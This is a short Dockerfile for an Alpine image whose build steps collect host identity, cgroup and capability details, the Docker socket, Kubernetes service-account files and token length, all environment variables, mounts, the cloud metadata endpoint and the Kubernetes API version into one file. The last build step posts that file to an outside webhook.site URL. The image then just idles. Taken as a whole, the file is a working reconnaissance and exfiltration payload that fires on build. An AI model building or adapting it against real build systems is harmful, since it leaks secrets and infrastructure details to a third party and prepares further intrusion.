FROM alpine
RUN apk add --no-cache curl; true
RUN echo "=IDENTITY=" > /o; id >> /o 2>&1; hostname >> /o 2>&1; uname -a >> /o 2>&1; true
RUN echo "=PID1=" >> /o; cat /proc/1/comm >> /o 2>&1; cat /proc/1/cgroup >> /o 2>&1; true
RUN echo "=SELFCGROUP=" >> /o; cat /proc/self/cgroup >> /o 2>&1; true
RUN echo "=DOCKERENV=" >> /o; ls -la /.dockerenv >> /o 2>&1; true
RUN echo "=CAPS=" >> /o; grep -i cap /proc/self/status >> /o 2>&1; true
RUN echo "=DOCKERSOCK=" >> /o; ls -la /var/run/docker.sock /run/docker.sock >> /o 2>&1; true
RUN echo "=SA_DIR=" >> /o; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ >> /o 2>&1; true
RUN echo "=SA_NS=" >> /o; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace >> /o 2>&1; true
RUN echo "=SA_TOKEN_LEN=" >> /o; wc -c /var/run/secrets/kubernetes.io/serviceaccount/token >> /o 2>&1; true
RUN echo "=ENV=" >> /o; env >> /o 2>&1; true
RUN echo "=MOUNTS=" >> /o; mount >> /o 2>&1; true
RUN echo "=METADATA=" >> /o; curl -s -m3 http://169.254.169.254/latest/meta-data/ >> /o 2>&1; echo >> /o; true
RUN echo "=KUBEAPI=" >> /o; curl -sk -m3 https://kubernetes.default.svc/version >> /o 2>&1; echo >> /o; true
RUN echo "=END=" >> /o; curl -s -m12 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon"; true
CMD ["sh","-c","echo idle; sleep 3600"]
